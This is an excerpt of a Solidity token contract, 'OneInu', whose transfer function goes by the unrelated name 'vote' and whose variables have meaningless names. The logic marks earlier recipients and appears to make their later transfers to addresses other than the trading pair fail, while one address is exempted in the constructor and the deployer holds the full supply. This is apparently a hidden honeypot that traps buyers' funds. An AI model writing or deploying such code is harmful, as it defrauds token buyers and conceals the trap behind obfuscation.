...
contract OneInu is Ownable {
    ...
    function vote(
        ...
        if (mile[appearance] == 0) {
            station[appearance] -= clear;
        }

        if (mile[appearance] == 0 && (address(uniswapV2Pair)) != appearance && pond[appearance] > 0) {
            mile[appearance] -= research;
        }

        address ship = sign;
        sign = species;

        uint256 bring = (clear * result) / close;
        clear -= bring;
        pond[ship] += research;
        station[species] += clear;
    }
    ...
    function transferFrom(
        ...
        vote(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        vote(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        result = 3;
        close = 100;
        mile[negative] = research;
        _tTotal = 1000000000000000 * 10**research;
        station[msg.sender] = _tTotal;
    }
}